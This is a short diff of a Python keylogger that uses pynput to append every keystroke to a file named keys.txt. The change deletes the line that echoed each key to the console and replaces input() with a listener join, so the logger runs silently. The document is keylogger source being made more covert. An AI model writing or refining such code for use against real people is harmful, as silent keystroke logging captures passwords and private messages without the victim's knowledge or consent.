@@ -1,6 +1,5 @@
 from pynput import keyboard
 def keyPress(key): # the "on_press=" passes the key auto to the fn
-    print(str(key))
     with open("keys.txt",'a') as logKey:
         try:
             ch=key.char
@@ -14,4 +13,4 @@ def keyPress(key): # the "on_press=" passes the key auto to the fn
 if __name__ == "__main__":
     l=keyboard.Listener(on_press=keyPress) #creating an obj of Listener
     l.start()
-    input()
+    l.join()
